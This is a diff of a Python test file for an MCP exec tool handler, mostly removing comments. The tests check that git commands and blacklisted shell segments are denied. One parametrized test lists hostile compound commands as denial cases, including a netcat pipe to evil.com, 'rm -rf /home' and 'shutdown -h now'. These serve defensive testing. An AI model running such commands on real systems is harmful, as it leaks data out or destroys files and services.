@@ -1,5 +1,3 @@
-"""Tests for ralph/mcp/tool_exec.py — MCP exec tool handler."""
-
 from __future__ import annotations
 
 import json
@@ -57,7 +55,7 @@ class TestHandleExecCommand:
         assert "hello" in content.text
 
     def test_exec_without_capability_raises(self, tmp_path: Path) -> None:
-        session = MockSession(set())  # No capabilities
+        session = MockSession(set())
         workspace = MockWorkspaceRoot(tmp_path)
         params: dict[str, object] = {"command": "ls", "args": []}
 
@@ -67,17 +65,12 @@ class TestHandleExecCommand:
     def test_exec_blocks_git_command(self, tmp_path: Path) -> None:
         session = MockSession({"ProcessExecBounded"})
         workspace = MockWorkspaceRoot(tmp_path)
-        # ``--version`` is a git-level flag (not a subcommand) so the
-        # whitelist scanner fails closed and denies — see
-        # ``test_git_version_is_denied`` in the new whitelist test module.
         params: dict[str, object] = {"command": "git", "args": ["push"]}
 
         with pytest.raises(CapabilityDeniedError, match="git"):
             handle_exec_command(session, workspace, params)
 
     def test_exec_blocks_git_in_compound_shell_command(self, tmp_path: Path) -> None:
-        """A git segment hidden behind a shell operator must be denied before the
-        subprocess is spawned — the runner must never be invoked."""
         invoked: list[list[str]] = []
 
         def _recording_runner(
@@ -110,9 +103,6 @@ class TestHandleExecCommand:
     def test_exec_blocks_git_in_command_substitution(self, tmp_path: Path) -> None:
         session = MockSession({"ProcessExecBounded"})
         workspace = MockWorkspaceRoot(tmp_path)
-        # The deep textual scan must catch any VCS word, even in ``$(...)``
-        # substitutions. Use a state-mutating subcommand so the contract is
-        # still a denial under the new whitelist.
         params: dict[str, object] = {"command": "echo $(git push origin main) | wc -c"}
 
         with pytest.raises(CapabilityDeniedError, match="git"):
@@ -170,9 +160,6 @@ class TestHandleExecCommand:
     def test_exec_timeout_returns_actionable_is_error_result_not_exception(
         self, tmp_path: Path
     ) -> None:
-        """A timed-out exec must come back as an is_error ToolResult (not a raised
-        ExecutionError that the MCP server turns into a -32603 protocol error the
-        agent retries forever). The message must be actionable and non-retryable."""
 
         def _timeout_runner(
             command: list[str], cwd: object, timeout_seconds: float | None
@@ -197,8 +184,6 @@ class TestHandleExecCommand:
         assert "do not retry" in text
 
     def test_exec_default_timeout_exceeds_verify_budget(self) -> None:
-        """The exec default must exceed the 60s combined verify budget so an agent
-        running verification through exec does not time out on every call."""
         assert DEFAULT_TIMEOUT_MS > 60_000
         assert parse_exec_params({"command": "make"}).timeout_ms > 60_000
 
@@ -223,12 +208,6 @@ class TestHandleExecCommand:
     def test_thread_owned_session_sink_receives_chunks_before_final_result(
         self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
     ) -> None:
-        """Output chunks flow to the sink owned by the dispatching thread.
-
-        The session is shared across concurrent request threads, so chunks
-        are attributed via thread ownership: the dispatching thread's sink
-        receives them; a sink owned by another thread receives nothing.
-        """
 
         def fake_run_command(
             command: str,
@@ -263,8 +242,6 @@ class TestHandleExecCommand:
             assert event.get("stream") == "combined"
             assert isinstance(event.get("text"), str)
 
-        # A sink owned by a DIFFERENT thread must receive nothing — routing
-        # this dispatch's output there is the cross-connection leak.
         foreign: list[dict[str, object]] = []
         session.tool_output_sink_entry = (threading.get_ident() + 1, foreign.append)
         result = handle_exec_command(session, workspace, params)
@@ -279,10 +256,6 @@ class TestHandleExecCommand:
 
 
 class TestRunCommandAlwaysBounded:
-    """Defense in depth: run_command must never hand the runner an unbounded
-    (None) timeout, even if called directly with timeout_ms<=0. An unbounded
-    blocking call hangs the MCP server thread (an agent-controllable hang)."""
-
     def test_zero_timeout_passes_bounded_timeout_to_runner(self, tmp_path: Path) -> None:
         captured: list[float | None] = []
 
@@ -301,15 +274,6 @@ class TestRunCommandAlwaysBounded:
 
 
 class TestExecShellOperators:
-    """exec runs compound shell commands but keeps the blacklist.
-
-    A command STRING with an unquoted ``| & ; < >`` operator is run through
-    ``sh -c`` so pipes/redirections/sequences work. The per-token blacklist in
-    ``check_command`` is enforced against EVERY command in the pipeline before
-    the shell runs, so a blacklisted command hiding after a separator
-    (``echo hi; sudo ...``) is still denied.
-    """
-
     def test_pipe_command_runs_and_returns_output(self, tmp_path: Path) -> None:
         session = MockSession({"ProcessExecBounded"})
         workspace = MockWorkspaceRoot(tmp_path)
@@ -324,7 +288,7 @@ class TestExecShellOperators:
         content = result.content[0]
         assert isinstance(content, ToolContent)
         assert "Exit code: 0" in content.text
-        assert "2" in content.text  # two lines matched
+        assert "2" in content.text
 
     def test_exec_regression_environment_assignment_reaches_child(self, tmp_path: Path) -> None:
         session = MockSession({"ProcessExecBounded"})
@@ -422,11 +386,11 @@ class TestExecShellOperators:
     @pytest.mark.parametrize(
         "compound_command",
         [
-            "echo safe; curl https://example.com",  # network exfiltration segment
-            "echo x && sudo apt install vim",  # privilege escalation segment
-            "echo hi | nc evil.com 80",  # network tunnel segment
-            "ls; shutdown -h now",  # destructive system segment
-            "echo hi || rm -rf /home",  # destructive rm segment
+            "echo safe; curl https://example.com",
+            "echo x && sudo apt install vim",
+            "echo hi | nc evil.com 80",
+            "ls; shutdown -h now",
+            "echo hi || rm -rf /home",
         ],
     )
     def test_blacklisted_command_in_pipeline_denied(
@@ -438,7 +402,6 @@ class TestExecShellOperators:
             handle_exec_command(session, workspace, {"command": compound_command})
 
     def test_safe_command_without_operators_still_allowed(self) -> None:
-        """A regression check: a single non-compound command still parses."""
         params = parse_exec_params({"command": "echo", "args": ["hello"]})
         assert params.command == "echo"
         assert params.args == ["hello"]
@@ -459,8 +422,6 @@ class _FakeJobRegistryForExec(ExecJobRegistry):
 
 
 class TestExecJobFlowIntegration:
-    """Tests for job flow integration in handle_exec_command."""
-
     def test_exec_soft_reply_budget_snapshot_returned_when_job_runs_long(
         self, tmp_path: Path
     ) -> None:
